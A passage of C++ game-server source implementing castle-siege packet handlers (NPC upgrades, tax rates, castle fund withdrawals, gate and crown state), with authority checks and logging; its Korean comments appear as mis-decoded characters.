							iNEED_GEMOFDEFEND	= g_iNpcUpMaxHP_CSTATUE[iNXT_UPLVL-1][1];
							iNEED_MONEY			= g_iNpcUpMaxHP_CSTATUE[iNXT_UPLVL-1][2];
						}
					}
					break;
				default :
					{
						// �ش� Ÿ���� ���� - ����
						GCAnsNpcUpgrade (iIndex, 5, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue);

						LogAddTD("[CastleSiege] CGReqNpcUpgrade() ERROR - UpType doesn't Exist [%s][%s], Guild:(%s)(%d), NPC CLS:%d, IDX:%d, UPTYPE:%d, UPVAL:%d",
							gObj[iIndex].AccountID,
							gObj[iIndex].Name,
							gObj[iIndex].GuildName,
							gObj[iIndex].GuildStatus,
							lpMsg->iNpcNumber,
							lpMsg->iNpcIndex,
							lpMsg->iNpcUpType,
							lpMsg->iNpcUpValue
							);
						return;
					}
					break;
				}
			}
			else {
				// NPC�� �������� �ʴ´� - ����
				GCAnsNpcUpgrade (iIndex, 7, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue);
				return;
			}
		}
		break;
	}

	if (bENABLE_UPGRADE == FALSE) {
		// ���׷��̵尡 �Ұ��ϴ� -> ������ �̻� ??
		GCAnsNpcUpgrade (iIndex, 6, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue);
		return;
	}

	// �ʿ��� ��� (��ȣ����) �� ����� �ִ��� Ȯ���Ѵ�. -> ������� �谨�� ���� ���� �Ŀ� ��
	if (gObj[iIndex].Money < iNEED_MONEY) {
		// �� ����
		GCAnsNpcUpgrade (iIndex, 3, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue);

		LogAddTD("[CastleSiege] CGReqNpcUpgrade() ERROR - Money is Low [%s][%s], Guild:(%s)(%d), NPC CLS:%d, IDX:%d, UPTYPE:%d, UPVAL:%d, NXTLV:%d, Money:%d, Need Money:%d",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus,
			lpMsg->iNpcNumber,
			lpMsg->iNpcIndex,
			lpMsg->iNpcUpType,
			lpMsg->iNpcUpValue,
			iNXT_UPLVL,
			gObj[iIndex].Money,
			iNEED_MONEY
			);
		return;
	}
	INT iGEMOFDEFEND_COUNT = 0;
#ifdef PERSONAL_SHOP_20040113
	for(int x=0; x<MAX_INVENTORY_EXTEND; x++)
#else
	for(int x=0; x<MAX_INVENTORY; x++)
#endif
	{
		if( gObj[iIndex].pInventory[x].IsItem() == TRUE )
		{
			if( gObj[iIndex].pInventory[x].m_Type == MAKE_ITEMNUM(14, 31) )
			{
				iGEMOFDEFEND_COUNT++;
			}
		}
	}
	if(iGEMOFDEFEND_COUNT < iNEED_GEMOFDEFEND) {
		GCAnsNpcUpgrade (iIndex, 4, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue);

		LogAddTD("[CastleSiege] CGReqNpcUpgrade() ERROR - Gem is Low [%s][%s], Guild:(%s)(%d), NPC CLS:%d, IDX:%d, UPTYPE:%d, UPVAL:%d, NXTLV:%d, Gem:%d, Need Gem:%d",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus,
			lpMsg->iNpcNumber,
			lpMsg->iNpcIndex,
			lpMsg->iNpcUpType,
			lpMsg->iNpcUpValue,
			iNXT_UPLVL,
			iGEMOFDEFEND_COUNT,
			iNEED_GEMOFDEFEND
			);
		return;
	}

	// ��ȿ���� ���������� Ȯ�εǾ��� -> ���׷��̵�
#ifdef MODIFY_CASTLE_NPC_UPGRADE_PROCESS_20060619
	// ���׷��̵忡 �ʿ��� ����� �����Ѵ�.
	BOOL bRETVAL = g_CastleSiege.PayForUpgradeDbNpc( iIndex, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue, iNXT_UPLVL-1 );
	if( bRETVAL == FALSE )
		return;

	// ��� ���ҿ� �����ߴٸ� ������ ���� �÷��� ���� �����Ѵ�.
	gObj[iIndex].m_bIsCastleNPCUpgradeCompleted = true;
	LogAddTD("[CastleSiege] [0xB2][0x07] CGReqNpcUpgrade() - Pay For Npc Upgrade (CLS:%d, IDX:%d, UPTYPE:%d, UPVAL:%d)",
		lpMsg->iNpcNumber, 
		lpMsg->iNpcIndex, 
		lpMsg->iNpcUpType, 
		iNXT_UPVALUE
		);
#endif	// #ifdef MODIFY_CASTLE_NPC_UPGRADE_PROCESS_20060619
	
//	GS_GDReqCastleNpcUpgrade (g_MapServerManager.GetMapSvrGroup(), iIndex, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue, iNXT_UPLVL-1);
	GS_GDReqCastleNpcUpgrade (g_MapServerManager.GetMapSvrGroup(), iIndex, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, iNXT_UPVALUE, iNXT_UPLVL-1);

	LogAddTD("[CastleSiege] CGReqNpcUpgrade() REQ OK - [%s][%s], Guild:(%s)(%d), NPC CLS:%d, IDX:%d, UPTYPE:%d, UPVAL:%d, NXTLV:%d",
		gObj[iIndex].AccountID,
		gObj[iIndex].Name,
		gObj[iIndex].GuildName,
		gObj[iIndex].GuildStatus,
		lpMsg->iNpcNumber,
		lpMsg->iNpcIndex,
		lpMsg->iNpcUpType,
		lpMsg->iNpcUpValue,
		iNXT_UPLVL
		);
#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x07] ������ NPC ���׷��̵� ��û ����
//----------------------------------------------------------------------------
void GCAnsNpcUpgrade				(INT iIndex, INT iResult, INT iNpcNumber, INT iNpcIndex, INT iNpcUpType, INT iNpcUpValue)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111
	
	PMSG_ANS_NPCUPGRADE pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x07, sizeof(PMSG_ANS_NPCREPAIR));
	pMsgResult.btResult			= (BYTE) iResult;
	pMsgResult.iNpcNumber		= iNpcNumber;
	pMsgResult.iNpcIndex		= iNpcIndex;
	pMsgResult.iNpcUpType		= iNpcUpType;
	pMsgResult.iNpcUpValue		= iNpcUpValue;

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

#endif
}


//----------------------------------------------------------------------------
// CG [0xB2][0x08] ���� ���� �ڱ�, ���� ���� ��û -> ����üũ, �������� ����
//----------------------------------------------------------------------------
void CGReqTaxMoneyInfo				(LPPMSG_REQ_TAXMONEYINFO lpMsg, INT iIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111

	if(lpMsg == NULL)
		return;
	
	// ��忡 ���ԵǾ����� �ʴٸ� �����Ѵ�.
	if (!strcmp(gObj[iIndex].GuildName, ""))
		return;

	// �ʿ��ϴٸ� ��û���� ������ üũ�Ѵ�. (������ Ư�� ������ �ƴ϶�� �Ұ�)
	if (g_CastleSiege.CheckGuildOwnCastle(gObj[iIndex].GuildName) == FALSE || gObj[iIndex].GuildStatus != G_MASTER) {
		LogAddC(LOGC_RED,"[CastleSiege] CGReqTaxMoneyInfo() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus
			);
		return;
	}

	GS_GDReqTaxInfo (g_MapServerManager.GetMapSvrGroup(), iIndex);

	LogAddTD("[CastleSiege] CGReqTaxMoneyInfo() REQ OK - [%s][%s], Guild:(%s)(%d)",
		gObj[iIndex].AccountID,
		gObj[iIndex].Name,
		gObj[iIndex].GuildName,
		gObj[iIndex].GuildStatus
		);
#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x08] ���� ���� �ڱ�, ���� ���� ��û ����
//----------------------------------------------------------------------------
void GCAnsTaxMoneyInfo				(INT iIndex, INT iResult, BYTE btTaxRateChaos, BYTE btTaxRateStore, INT64 i64Money)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111
	
	PMSG_ANS_TAXMONEYINFO pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x08, sizeof(PMSG_ANS_TAXMONEYINFO));
	pMsgResult.btResult			= (BYTE) iResult;
	pMsgResult.btTaxRateChaos	= btTaxRateChaos;
	pMsgResult.btTaxRateStore	= btTaxRateStore;
	pMsgResult.btMoney1			= HIBYTE(HIWORD(HILONG(i64Money)));
	pMsgResult.btMoney2			= LOBYTE(HIWORD(HILONG(i64Money)));
	pMsgResult.btMoney3			= HIBYTE(LOWORD(HILONG(i64Money)));
	pMsgResult.btMoney4			= LOBYTE(LOWORD(HILONG(i64Money)));
	pMsgResult.btMoney5			= HIBYTE(HIWORD(LOLONG(i64Money)));
	pMsgResult.btMoney6			= LOBYTE(HIWORD(LOLONG(i64Money)));
	pMsgResult.btMoney7			= HIBYTE(LOWORD(LOLONG(i64Money)));
	pMsgResult.btMoney8			= LOBYTE(LOWORD(LOLONG(i64Money)));

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

#endif
}


//----------------------------------------------------------------------------
// CG [0xB2][0x09] ���� ���� ���� ���� ��û -> ����üũ, �������� ����
//----------------------------------------------------------------------------
void CGReqTaxRateChange				(LPPMSG_REQ_TAXRATECHANGE lpMsg, INT iIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111

	if(lpMsg == NULL)
		return;
	
	// ��忡 ���ԵǾ����� �ʴٸ� �����Ѵ�.
	if (!strcmp(gObj[iIndex].GuildName, ""))
		return;

	// �ʿ��ϴٸ� ��û���� ������ üũ�Ѵ�. (������ Ư�� ������ �ƴ϶�� �Ұ�)
	if (g_CastleSiege.CheckGuildOwnCastle(gObj[iIndex].GuildName) == FALSE || gObj[iIndex].GuildStatus != G_MASTER) {
		LogAddC(LOGC_RED,"[CastleSiege] CGReqTaxRateChange() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus
			);
		return;
	}

	// ������ ������ üũ�Ѵ�.
	INT iMaxTaxRate		= 0;
	switch (lpMsg->btTaxType) {
	case CS_TAXRATE_TYPE_CHAOS :
		{
			iMaxTaxRate = MAX_CS_TAX_RATE_CHAOS;
		}
		break;
	case CS_TAXRATE_TYPE_STORE :
		{
			iMaxTaxRate = MAX_CS_TAX_RATE_STORE;
		}
		break;
	case CS_TAXRATE_TYPE_HUNTZONE :
		{
			iMaxTaxRate = MAX_CS_TAX_HUNT_ZONE;
		}
		break;
	}

	INT iTaxRate		= MAKELONG(MAKEWORD(lpMsg->btTaxRate4, lpMsg->btTaxRate3), MAKEWORD(lpMsg->btTaxRate2, lpMsg->btTaxRate1));

	if (iTaxRate < 0 || iTaxRate > iMaxTaxRate) {
		GCAnsTaxRateChange (iIndex, 0, 0, 0);

		LogAddTD("[CastleSiege] CGReqTaxRateChange() ERROR - Tax Rate Out of Range [%s][%s], Guild:(%s)(%d), TaxType:%d, TaxRate:%d",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus,
			lpMsg->btTaxType,
			iTaxRate
			);
		return;
	}

	GS_GDReqTaxRateChange (g_MapServerManager.GetMapSvrGroup(), iIndex, lpMsg->btTaxType, iTaxRate);

	LogAddTD("[CastleSiege] CGReqTaxRateChange() REQ OK - [%s][%s], Guild:(%s)(%d), TaxType:%d, TaxRate:%d",
		gObj[iIndex].AccountID,
		gObj[iIndex].Name,
		gObj[iIndex].GuildName,
		gObj[iIndex].GuildStatus,
		lpMsg->btTaxType,
		iTaxRate
		);
#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x09] ���� ���� ���� ���� ��û ����
//----------------------------------------------------------------------------
void GCAnsTaxRateChange				(INT iIndex, INT iResult, BYTE btTaxType, INT iTaxRate)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111
	
	PMSG_ANS_TAXRATECHANGE pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x09, sizeof(PMSG_ANS_TAXRATECHANGE));
	pMsgResult.btResult			= (BYTE) iResult;
	pMsgResult.btTaxType		= btTaxType;

	pMsgResult.btTaxRate1		= HIBYTE(HIWORD(iTaxRate));
	pMsgResult.btTaxRate2		= LOBYTE(HIWORD(iTaxRate));
	pMsgResult.btTaxRate3		= HIBYTE(LOWORD(iTaxRate));
	pMsgResult.btTaxRate4		= LOBYTE(LOWORD(iTaxRate));

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

#endif
}


//----------------------------------------------------------------------------
// CG [0xB2][0x10] ���� ���� �ڱ� ��� ��û -> ����üũ, �������� ����
//----------------------------------------------------------------------------
void CGReqMoneyDrawOut				(LPPMSG_REQ_MONEYDRAWOUT lpMsg, INT iIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111
	
	if(lpMsg == NULL)
		return;
	
	// ��忡 ���ԵǾ����� �ʴٸ� �����Ѵ�.
	if (!strcmp(gObj[iIndex].GuildName, ""))
		return;

	// �ʿ��ϴٸ� ��û���� ������ üũ�Ѵ�. (������ Ư�� ������ �ƴ϶�� �Ұ�)
	if (g_CastleSiege.CheckGuildOwnCastle(gObj[iIndex].GuildName) == FALSE || gObj[iIndex].GuildStatus != G_MASTER) {
		LogAddC(LOGC_RED,"[CastleSiege] CGReqMoneyDrawOut() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus
			);
		return;
	}

	// ���� �׼��� ������� üũ�Ѵ� -> ��û�� ���� ������ �ؾ��ϹǷ� �ƴ϶�� ����
	INT iMoneyChange	= MAKELONG(MAKEWORD(lpMsg->btMoney1, lpMsg->btMoney2),MAKEWORD(lpMsg->btMoney3, lpMsg->btMoney4));
	if (iMoneyChange <= 0) {
		GCAnsMoneyDrawOut (iIndex, 0, 0);

		LogAddTD("[CastleSiege] CGReqMoneyDrawOut() ERROR - Req Money < 0 [%s][%s], Guild:(%s)(%d), Money:%d, TotMoney:%d",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus,
			iMoneyChange,
			gObj[iIndex].Money
			);
		return;
	}

	// ���� ���� ���� �׸�ŭ �ִ��� Ȯ���Ѵ�.
	BOOL bRETVAL		= g_CastleSiege.CheckCastleHasMoney((INT64)iMoneyChange);
	if (bRETVAL == FALSE) {
		GCAnsMoneyDrawOut (iIndex, 0, 0);

		LogAddTD("[CastleSiege] CGReqMoneyDrawOut() ERROR - Castle Money is Low [%s][%s], Guild:(%s)(%d), Money:%d, TotMoney:%d",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus,
			iMoneyChange,
			gObj[iIndex].Money
			);
		return;
	}

	// ������� ���� �������� �ʴ��� Ȯ���Ѵ�.
#ifdef MODIFY_ZEN_MAX_20040414
	if (gObj[iIndex].Money + iMoneyChange > MAX_ZEN) {
		GCAnsMoneyDrawOut (iIndex, 0, 0);
		return;
	}
#else
	if (gObj[iIndex].Money + iMoneyChange > 2000000000) {
		GCAnsMoneyDrawOut (iIndex, 0, 0);

		LogAddTD("[CastleSiege] CGReqMoneyDrawOut() ERROR - Money Over [%s][%s], Guild:(%s)(%d), Money:%d, TotMoney:%d",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus,
			iMoneyChange,
			gObj[iIndex].Money
			);
		return;
	}
#endif
	
	GS_GDReqCastleMoneyChange (g_MapServerManager.GetMapSvrGroup(), iIndex, -iMoneyChange);

	LogAddTD("[CastleSiege] CGReqMoneyDrawOut() REQ OK - [%s][%s], Guild:(%s)(%d), Money:%d, TotMoney:%d",
		gObj[iIndex].AccountID,
		gObj[iIndex].Name,
		gObj[iIndex].GuildName,
		gObj[iIndex].GuildStatus,
		iMoneyChange,
		gObj[iIndex].Money
		);
#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x10] ���� ���� �ڱ� ��� ��û ����
//----------------------------------------------------------------------------
void GCAnsMoneyDrawOut				(INT iIndex, INT iResult, INT64 i64Money)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111

	PMSG_ANS_MONEYDRAWOUT pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x10, sizeof(PMSG_ANS_MONEYDRAWOUT));
	pMsgResult.btResult			= (BYTE) iResult;
	pMsgResult.btMoney1			= HIBYTE(HIWORD(HILONG(i64Money)));
	pMsgResult.btMoney2			= LOBYTE(HIWORD(HILONG(i64Money)));
	pMsgResult.btMoney3			= HIBYTE(LOWORD(HILONG(i64Money)));
	pMsgResult.btMoney4			= LOBYTE(LOWORD(HILONG(i64Money)));
	pMsgResult.btMoney5			= HIBYTE(HIWORD(LOLONG(i64Money)));
	pMsgResult.btMoney6			= LOBYTE(HIWORD(LOLONG(i64Money)));
	pMsgResult.btMoney7			= HIBYTE(LOWORD(LOLONG(i64Money)));
	pMsgResult.btMoney8			= LOBYTE(LOWORD(LOLONG(i64Money)));

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x11] ���� ������ ����� �������� ��û ���� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsGateState			(INT iIndex, INT iResult, INT iGateIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111
	
	PMSG_ANS_CSGATESTATE pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x11, sizeof(PMSG_ANS_CSGATESTATE));
	pMsgResult.btResult			= (BYTE) iResult;
	pMsgResult.btIndex1			= HIBYTE((WORD)iGateIndex);
	pMsgResult.btIndex2			= LOBYTE((WORD)iGateIndex);

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

#endif
}


//----------------------------------------------------------------------------
// CG [0xB2][0x12] Ư�� ������ ���� ������� ��û (0xC1)
//----------------------------------------------------------------------------
void CGReqCsGateOperate			(LPPMSG_REQ_CSGATEOPERATE lpMsg, INT iIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111
	
	// ��忡 ���ԵǾ����� �ʴٸ� �����Ѵ�.
	if (!strcmp(gObj[iIndex].GuildName, ""))
		return;

	// ���⼭ �ش� ����ڰ� ������ ������ �� �ִ��� �⺻ ������ üũ�Ѵ�. (������ ���������� CCastleSiege::OperateGate() �ȿ��� ��)
	if (g_CastleSiege.GetCastleState() == CASTLESIEGE_STATE_STARTSIEGE) {
		if (gObj[iIndex].m_btCsJoinSide != CS_SIEGESIDE_DEFEND) {
			LogAddTD("[CastleSiege] CGReqCsGateOperate() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
				gObj[iIndex].AccountID,
				gObj[iIndex].Name,
				gObj[iIndex].GuildName,
				gObj[iIndex].GuildStatus
				);
			return;
		}
	}
	else {
//		if (g_CastleSiege.CheckGuildOwnCastle(gObj[iIndex].GuildName) == FALSE &&
		if (g_CastleSiege.CheckCastleOwnerMember(iIndex) == FALSE &&
			g_CastleSiege.CheckCastleOwnerUnionMember(iIndex) == FALSE
			) 
		{
			LogAddTD("[CastleSiege] CGReqCsGateOperate() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
				gObj[iIndex].AccountID,
				gObj[iIndex].Name,
				gObj[iIndex].GuildName,
				gObj[iIndex].GuildStatus
				);
			return;
		}
	}

	// ������ �ε����� �޾Ƽ� ������ ������
	INT iGateIndex				= (INT)MAKEWORD(lpMsg->btIndex2, lpMsg->btIndex1);
	if (g_CastleSiege.CheckCsGateAlive(iGateIndex) == TRUE) {
		BOOL bRETVAL		= g_CastleSiege.OperateGate(iGateIndex, gObj[iGateIndex].m_iCsNpcExistVal, lpMsg->btOperate);
		if (bRETVAL == FALSE) {
			GCAnsCsGateOperate (iIndex, 0, -1, 0);

			LogAddTD("[CastleSiege] CGReqCsGateOperate() ERROR - Operate Gate Failed [%s][%s], Guild:(%s)(%d)",
				gObj[iIndex].AccountID,
				gObj[iIndex].Name,
				gObj[iIndex].GuildName,
				gObj[iIndex].GuildStatus
				);
		}
		else {
			// ������ ���������� �����ߴ�.
			GCAnsCsGateOperate (iIndex, 1, iGateIndex, lpMsg->btOperate);	

			// ������ �����ִ� ����鿡�Ե� ���¸� �����ش�.
			g_CastleSiege.SendCsGateStateViewPort (iGateIndex, lpMsg->btOperate);

			LogAddTD("[CastleSiege] CGReqCsGateOperate() OK - [%s][%s], Guild:(%s)(%d), DOOR:(%d)(X:%d,Y:%d)(STATUE:%d)",
				gObj[iIndex].AccountID,
				gObj[iIndex].Name,
				gObj[iIndex].GuildName,
				gObj[iIndex].GuildStatus,
				iGateIndex,
				gObj[iGateIndex].X,
				gObj[iGateIndex].Y,
				gObj[iGateIndex].m_btCsGateOpen
				);
		}
	}
	else {
		// ������ �������� �ʴ´�.
		GCAnsCsGateOperate (iIndex, 2, -1, 0);	

		LogAddTD("[CastleSiege] CGReqCsGateOperate() ERROR - Gate Doesn't Exist [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus
			);
	}

#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x12] Ư�� ������ ���� ������� ��û ���� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsGateOperate			(INT iIndex, INT iResult, INT iGateIndex, INT iGateOperate)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111

	PMSG_ANS_CSGATEOPERATE pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x12, sizeof(PMSG_ANS_CSGATEOPERATE));
	pMsgResult.btResult			= (BYTE) iResult;
	pMsgResult.btOperate		= (BYTE) iGateOperate;
	pMsgResult.btIndex1			= HIBYTE((WORD)iGateIndex);
	pMsgResult.btIndex2			= LOBYTE((WORD)iGateIndex);

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x13] Ư�� ������ ���� ���������� ������ (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsGateCurState		(INT iIndex, INT iGateIndex, INT iGateOperate)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111

	PMSG_ANS_CSGATECURSTATE pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x13, sizeof(PMSG_ANS_CSGATECURSTATE));
	pMsgResult.btOperate		= (BYTE) iGateOperate;
	pMsgResult.btIndex1			= HIBYTE((WORD)iGateIndex);
	pMsgResult.btIndex2			= LOBYTE((WORD)iGateIndex);

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x14] Ư�� ������� �հ� ����ġ �۵����θ� �˸� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsAccessSwitchState	(INT iIndex, INT iSwitchIndex, INT iSwitchUserIndex, BYTE btSwitchState)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111
	
	PMSG_ANS_NOTIFYSWITCHPROC pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x14, sizeof(PMSG_ANS_NOTIFYSWITCHPROC));
	pMsgResult.btIndex1			= HIBYTE((WORD)iSwitchIndex);
	pMsgResult.btIndex2			= LOBYTE((WORD)iSwitchIndex);
	pMsgResult.btUserIndex1		= HIBYTE((WORD)iSwitchUserIndex);
	pMsgResult.btUserIndex2		= LOBYTE((WORD)iSwitchUserIndex);
	pMsgResult.btSwitchState	= btSwitchState;

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x15] Ư�� ������� �հ� ���ε�� ���θ� �˸� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsAccessCrownState	(INT iIndex, BYTE btCrownState)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111

	PMSG_ANS_NOTIFYCROWNPROC pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x15, sizeof(PMSG_ANS_NOTIFYCROWNPROC));
	pMsgResult.btCrownState		= btCrownState;


#ifdef MODIFY_CASTLESIEGE_CALC_CROWN_ACCESSTIME_20051014
	// btCrownState �� 2(���ε�Ͻ���)�� ��� �� ������ �ð��� �˸���.

	// 0 . > ���� ��� �õ� 
	if( btCrownState == 0 )
	{
		// 2-3 . > ���� ó��
#ifdef MODIFY_CASTLE_CROWN_ACCESS_TIME_CHECK_BUGFIX_20080403
		if( gObj[iIndex].m_iAccumulatedCrownAccessTime < 0 
			|| gObj[iIndex].m_iAccumulatedCrownAccessTime > CS_CASTLE_CROWN_ACCESS_TIME + 1000 )
#else	// MODIFY_CASTLE_CROWN_ACCESS_TIME_CHECK_BUGFIX_20080403		
		if( gObj[iIndex].m_iAccumulatedCrownAccessTime < 0 
			|| gObj[iIndex].m_iAccumulatedCrownAccessTime > CS_CASTLE_CROWN_ACCESS_TIME )
#endif	// MODIFY_CASTLE_CROWN_ACCESS_TIME_CHECK_BUGFIX_20080403
		{
			gObj[iIndex].m_iAccumulatedCrownAccessTime = 0;
		}

		// ���� �� �ð��� �˸���.
//		MsgOutput( iIndex, "[��Ͻõ�] �����ð� : %d", gObj[iIndex].m_iAccumulatedCrownAccessTime );
		
		LogAddTD( "[CastleSiege] [Reg. Attempt] Accumulated Crown AccessTime : %d [%s](%s)(%s)", 
			gObj[iIndex].m_iAccumulatedCrownAccessTime, 
			gObj[iIndex].GuildName, gObj[iIndex].AccountID, gObj[iIndex].Name );
	}

	// 1 . > ���� ��� ����
	if( btCrownState == 1 )
	{
		// �� ���� ���� �� �ð��� �˸���.
//		MsgOutput( iIndex, "[��ϼ���] �����ð� : %d", gObj[iIndex].m_iAccumulatedCrownAccessTime );

		LogAddTD( "[CastleSiege] [Reg. Success] Accumulated Crown AccessTime : %d [%s](%s)(%s)", 
			gObj[iIndex].m_iAccumulatedCrownAccessTime, 
			gObj[iIndex].GuildName, gObj[iIndex].AccountID, gObj[iIndex].Name );

		gObj[iIndex].m_iAccumulatedCrownAccessTime = 0;

	}

	// 2 . > ���� ��� ����
	if( btCrownState == 2 )
	{
		
		// 2-1 . > ���� ��� ���� �� �ð��� ���� ��Ų��.
		// ���� �ð� �̻����� ������ ū ���� �� ��쿡 ���� ��� �ڵ带 �������!
		gObj[iIndex].m_iAccumulatedCrownAccessTime += GetTickCount() -  g_CastleSiege.GetCrownAccessTickCount();


#ifndef MODIFY_CASTLE_CROWN_ACCESS_TIME_20070828	// �����ð� �г�Ƽ ����
		// 2-2 . > ���� ��� ���� �� ���� �ð����� 5�� ���� ��Ų��.
		int iDecTime = 5 * 1000;
		gObj[iIndex].m_iAccumulatedCrownAccessTime -= iDecTime;
#endif

		
		// 2-3 . > ���� ó��
#ifdef MODIFY_CASTLE_CROWN_ACCESS_TIME_CHECK_BUGFIX_20080403
		if( gObj[iIndex].m_iAccumulatedCrownAccessTime < 0 
			|| gObj[iIndex].m_iAccumulatedCrownAccessTime > CS_CASTLE_CROWN_ACCESS_TIME + 1000)
#else	// MODIFY_CASTLE_CROWN_ACCESS_TIME_CHECK_BUGFIX_20080403
		if( gObj[iIndex].m_iAccumulatedCrownAccessTime < 0 
			|| gObj[iIndex].m_iAccumulatedCrownAccessTime > CS_CASTLE_CROWN_ACCESS_TIME )
#endif	// MODIFY_CASTLE_CROWN_ACCESS_TIME_CHECK_BUGFIX_20080403
		{
			gObj[iIndex].m_iAccumulatedCrownAccessTime = 0;
		}

		// �� ���� ���� �� �ð��� �˸���.
//		MsgOutput( iIndex, "[��Ͻ���] ���ҽð� : %d, �����ð� : %d", iDecTime, gObj[iIndex].m_iAccumulatedCrownAccessTime );

		LogAddTD( "[CastleSiege] [Reg. Fail] Accumulated Crown AccessTime : %d [%s](%s)(%s)", 
			gObj[iIndex].m_iAccumulatedCrownAccessTime, 
			gObj[iIndex].GuildName, gObj[iIndex].AccountID, gObj[iIndex].Name );
	}

	// 3. > �ٸ� ����� ��� �� 
	if( btCrownState == 3)
	{
		// �� ���� ���� �� �ð��� �˸���.
//		MsgOutput( iIndex, "[�ٸ���������] �����ð� : %d", gObj[iIndex].m_iAccumulatedCrownAccessTime );

	}
	
	// 4. > �հ� ����ġ�� �۵� ��Ų ������ ���� ���������� �ƴ�
	if( btCrownState == 4)
	{
//		MsgOutput( iIndex, "[����] �հ�����ġ �۵� ������ �ٸ� �������� �����ð� : %d", gObj[iIndex].m_iAccumulatedCrownAccessTime );
	}

	pMsgResult.dwAccumulatedCrownAccessTime = gObj[iIndex].m_iAccumulatedCrownAccessTime;
#endif


	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x17] ���� ������ ���� ���θ� �˸� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsNotifyStart			(INT iIndex, BYTE btStartState)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111

	PMSG_ANS_NOTIFYCSSTART pMsgResult;
